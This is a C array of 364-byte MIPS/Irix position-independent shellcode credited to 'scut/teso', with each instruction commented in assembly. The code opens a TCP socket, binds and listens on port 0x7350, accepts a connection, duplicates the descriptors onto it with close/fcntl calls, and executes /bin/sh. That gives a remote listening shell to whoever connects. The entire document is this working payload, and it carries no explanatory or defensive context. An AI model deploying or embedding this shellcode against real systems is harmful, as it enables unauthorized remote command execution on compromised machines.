/* 364 byte MIPS/Irix PIC listening portshell shellcode. -scut/teso
 */
unsigned long int shellcode[] = {
                0x2416fffd,     /* li           $s6, -3                 */
                0x02c07027,     /* nor          $t6, $s6, $zero         */
                0x01ce2025,     /* or           $a0, $t6, $t6           */
                0x01ce2825,     /* or           $a1, $t6, $t6           */
                0x240efff9,     /* li           $t6, -7                 */
                0x01c03027,     /* nor          $a2, $t6, $zero         */
                0x24020453,     /* li           $v0, 1107 (socket)      */
                0x0101010c,     /* syscall                              */
                0x240f7350,     /* li           $t7, 0x7350 (nop)       */

                0x3050ffff,     /* andi         $s0, $v0, 0xffff        */
                0x280d0101,     /* slti         $t5, $zero, 0x0101      */
                0x240effee,     /* li           $t6, -18                */
                0x01c07027,     /* nor          $t6, $t6, $zero         */
                0x01cd6804,     /* sllv         $t5, $t5, $t6           */
                0x240e7350,     /* li           $t6, 0x7350 (port)      */
                0x01ae6825,     /* or           $t5, $t5, $t6           */
                0xafadfff0,     /* sw           $t5, -16($sp)           */
                0xafa0fff4,     /* sw           $zero, -12($sp)         */
                0xafa0fff8,     /* sw           $zero, -8($sp)          */
                0xafa0fffc,     /* sw           $zero, -4($sp)          */
                0x02102025,     /* or           $a0, $s0, $s0           */
                0x240effef,     /* li           $t6, -17                */
                0x01c03027,     /* nor          $a2, $t6, $zero         */
                0x03a62823,     /* subu         $a1, $sp, $a2           */
                0x24020442,     /* li           $v0, 1090 (bind)        */
                0x0101010c,     /* syscall                              */
                0x240f7350,     /* li           $t7, 0x7350 (nop)       */

                0x02102025,     /* or           $a0, $s0, $s0           */
                0x24050101,     /* li           $a1, 0x0101             */
                0x24020448,     /* li           $v0, 1096 (listen)      */
                0x0101010c,     /* syscall                              */
                0x240f7350,     /* li           $t7, 0x7350 (nop)       */

                0x02102025,     /* or           $a0, $s0, $s0           */
                0x27a5fff0,     /* addiu        $a1, $sp, -16           */
                0x240dffef,     /* li           $t5, -17                */
                0x01a06827,     /* nor          $t5, $t5, $zero         */
                0xafadffec,     /* sw           $t5, -20($sp)           */
                0x27a6ffec,     /* addiu        $a2, $sp, -20           */
                0x24020441,     /* li           $v0, 1089 (accept)      */
                0x0101010c,     /* syscall                              */
                0x240f7350,     /* li           $t7, 0x7350 (nop)       */
                0x3057ffff,     /* andi         $s7, $v0, 0xffff        */

                0x2804ffff,     /* slti         $a0, $zero, -1          */
                0x240203ee,     /* li           $v0, 1006 (close)       */
                0x0101010c,     /* syscall                              */
                0x240f7350,     /* li           $t7, 0x7350 (nop)       */

                0x02f72025,     /* or           $a0, $s7, $s7           */
                0x2805ffff,     /* slti         $a1, $zero, -1          */
                0x2806ffff,     /* slti         $a2, $zero, -1          */
                0x24020426,     /* li           $v0, 1062 (fcntl)       */
                0x0101010c,     /* syscall                              */
                0x240f7350,     /* li           $t7, 0x7350 (nop)       */

                0x28040101,     /* slti         $a0, $zero, 0x0101      */
                0x240203ee,     /* li           $v0, 1006 (close)       */
                0x0101010c,     /* syscall                              */
                0x240f7350,     /* li           $t7, 0x7350 (nop)       */

                0x02f72025,     /* or           $a0, $s7, $s7           */
                0x2805ffff,     /* slti         $a1, $zero, -1          */
                0x28060101,     /* slti         $a2, $zero, 0x0101      */
                0x24020426,     /* li           $v0, 1062 (fcntl)       */
                0x0101010c,     /* syscall                              */
                0x240f7350,     /* li           $t7, 0x7350             */

                0x02c02027,     /* nor          $a0, $s6, $zero         */
                0x240203ee,     /* li           $v0, 1006 (close)       */
                0x0101010c,     /* syscall                              */
                0x240f7350,     /* li           $t7, 0x7350 (nop)       */

                0x02f72025,     /* or           $a0, $s7, $s7           */
                0x2805ffff,     /* slti         $a1, $zero, -1          */
                0x02c03027,     /* nor          $a2, $s6, $zero         */
                0x24020426,     /* li           $v0, 1062 (fcntl)       */
                0x0101010c,     /* syscall                              */
                0x240f7350,     /* li           $t7, 0x7350 (nop)       */

                0xafa0fffc,     /* sw           $zero, -4($sp)          */
                0x24068cb0,     /* li           $a2, -29520             */
                0x04d0ffff,     /* bltzal       $a2, pc-4               */
                0x8fa6fffc,     /* lw           $a2, -4($sp)            */
                0x240fffc7,     /* li           $t7, -57                */
                0x01e07827,     /* nor          $t7, $t7, $zero         */
                0x03eff821,     /* addu         $ra, $ra, $t7           */
                0x23e4fff8,     /* addi         $a0, $ra, -8            */
                0x8fedfffc,     /* lw           $t5, -4($ra)            */
                0x25adffbe,     /* addiu        $t5, $t5, -66           */
                0xafedfffc,     /* sw           $t5, -4($ra)            */
                0xafa4fff8,     /* sw           $a0, -8($sp)            */
                0x27a5fff8,     /* addiu        $a1, $sp, -8            */
                0x24020423,     /* li           $v0, 1059 (execve)      */
                0x0101010c,     /* syscall                              */
                0x240f7350,     /* li           $t7, 0x7350 (nop)       */
                0x2f62696e,     /* .ascii       "/bin"                  */
                0x2f736842,     /* .ascii       "/sh", .byte 0xdummy    */
};